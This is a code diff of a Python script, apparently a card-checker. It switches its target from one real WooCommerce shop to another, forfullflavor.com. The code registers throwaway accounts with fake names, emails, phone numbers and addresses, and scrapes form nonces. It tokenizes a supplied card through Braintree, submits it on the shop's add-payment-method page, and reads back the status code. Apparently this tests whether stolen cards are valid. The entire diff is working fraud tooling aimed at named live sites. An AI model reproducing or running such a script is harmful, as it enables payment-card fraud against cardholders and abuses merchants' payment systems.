@@ -87,12 +87,16 @@ def Tele(ccx):
 	first_name, last_name = generate_full_name()
 	city, state, street_address, zip_code = generate_address()
 			
-	def generate_password(length=12):
-		name = ''.join(random.choices(string.ascii_lowercase, k=13))
+			
+			
+			
+			
+	def generate_random_account():
+		name = ''.join(random.choices(string.ascii_lowercase, k=20))
 		number = ''.join(random.choices(string.digits, k=4))
-		return f"{name}{number}"
-	password = generate_password()			
-	acc = (generate_random_account())+"@gmail.com"
+				
+		return f"{name}{number}@gmail.com"
+	acc = (generate_random_account())
 			
 		
 	def username():
@@ -105,8 +109,8 @@ def Tele(ccx):
 			
 			
 	def num():
-		number = ''.join(random.choices(string.digits, k=8))
-		return f"014{number}"
+		number = ''.join(random.choices(string.digits, k=7))
+		return f"303{number}"
 	num = (num())
 			
 			
@@ -129,7 +133,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://www.bebebrands.com/my-account', headers=headers)
+	response = r.get('https://forfullflavor.com/my-account/', headers=headers)
 	
 	
 	
@@ -147,31 +151,14 @@ def Tele(ccx):
 	}
 	
 	data = {
-    'username': username,
-    'email': acc,
-    'password': password,
-    'wc_order_attribution_source_type': '',
-    'wc_order_attribution_referrer': '(none)',
-    'wc_order_attribution_utm_campaign': '(none)',
-    'wc_order_attribution_utm_source': '(direct)',
-    'wc_order_attribution_utm_medium': '(none)',
-    'wc_order_attribution_utm_content': '(none)',
-    'wc_order_attribution_utm_id': '(none)',
-    'wc_order_attribution_utm_term': '(none)',
-    'wc_order_attribution_utm_source_platform': '(none)',
-    'wc_order_attribution_utm_creative_format': '(none)',
-    'wc_order_attribution_utm_marketing_tactic': '(none)',
-    'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/add-payment-method/',
-    'wc_order_attribution_session_start_time': '2024-07-17 11:50:51',
-    'wc_order_attribution_session_pages': 4,
-    'wc_order_attribution_session_count': 1,
-    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'woocommerce-register-nonce': register,
-    '_wp_http_referer': '/my-account/',
-    'register': 'Register'
+	    'username': username,
+	    'email': acc,
+	    'woocommerce-register-nonce': register,
+	    '_wp_http_referer': '/my-account/',
+	    'register': 'Register',
 	}
 	
-	response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)
+	response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
 	
 	headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -180,7 +167,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
+	response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
 	
 	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
 	
@@ -194,24 +181,24 @@ def Tele(ccx):
 	}
 	
 	data = {
-    'billing_first_name': first_name,
-    'billing_last_name': last_name,
-    'billing_company': '',
-    'billing_country': 'GB',
-    'billing_address_1': street_address,
-    'billing_address_2': '',
-    'billing_city': 'Letchworth Garden City',
-    'billing_state': '',
-    'billing_postcode': 'SG63ED',
-    'billing_phone': num,
-    'billing_email': acc,
-    'save_address': 'Save address',
-    'woocommerce-edit-address-nonce': address,
-    '_wp_http_referer': '/my-account/edit-address/billing/',
-    'action': 'edit_address'
-	}	
+	    'billing_first_name': first_name,
+	    'billing_last_name': last_name,
+	    'billing_company': '',
+	    'billing_country': 'US',
+	    'billing_address_1': street_address,
+	    'billing_address_2': '',
+	    'billing_city': city,
+	    'billing_state': state,
+	    'billing_postcode': zip_code,
+	    'billing_phone': num,
+	    'billing_email': acc,
+	    'save_address': 'Save address',
+	    'woocommerce-edit-address-nonce': address,
+	    '_wp_http_referer': '/my-account/edit-address/billing/',
+	    'action': 'edit_address',
+	}
 	
-	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
 	
 	
 	
@@ -222,7 +209,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+	response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
 	
 	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 	
@@ -243,7 +230,7 @@ def Tele(ccx):
 		    'nonce': client,
 	}
 		
-	response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
 	
 	enc = response.json()['data']
 	
@@ -306,28 +293,25 @@ def Tele(ccx):
 	}
 		
 	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'visa',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '{"correlation_id":"9d5da7f7d4541e486f634c9d0d287145"}',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'wc_braintree_paypal_payment_nonce': '',
-    'wc_braintree_paypal_device_data': '{"correlation_id":"9d5da7f7d4541e486f634c9d0d287145"}',
-    'wc-braintree-paypal-context': 'shortcode',
-    'wc_braintree_paypal_amount': '0.00',
-    'wc_braintree_paypal_currency': 'GBP',
-    'wc_braintree_paypal_locale': 'en_gb',
-    'wc-braintree-paypal-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1'
-	}
+		    'payment_method': 'braintree_credit_card',
+		    'wc-braintree-credit-card-card-type': 'master-card',
+		    'wc-braintree-credit-card-3d-secure-enabled': '',
+		    'wc-braintree-credit-card-3d-secure-verified': '',
+		    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+		    'wc_braintree_credit_card_payment_nonce': tok,
+		    'wc_braintree_device_data': '',
+		    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+		    'woocommerce-add-payment-method-nonce': add_nonce,
+		    '_wp_http_referer': '/my-account/add-payment-method/',
+		    'woocommerce_add_payment_method': '1',
+		}
 		
-	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+				
 			
+		
+		
+		
 	text = response.text
 		
 	pattern = r'Status code (.*?)\s*</li>'
